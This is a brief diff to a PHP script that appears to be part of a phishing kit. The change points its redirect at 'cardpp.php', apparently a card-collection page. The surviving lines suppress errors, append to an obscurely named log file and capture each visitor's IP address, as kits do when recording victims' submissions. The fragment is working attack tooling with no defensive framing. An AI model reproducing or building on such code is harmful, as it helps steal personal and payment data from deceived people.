@@ -1,5 +1,5 @@
 <?php
-header('location: accounts.php');
+header('location: cardpp.php');
 error_reporting(0);
 $handle = fopen("jjjjjjteyeuyteiolkuyghnb.html","a");
 $ip =  $_SERVER['REMOTE_ADDR'];
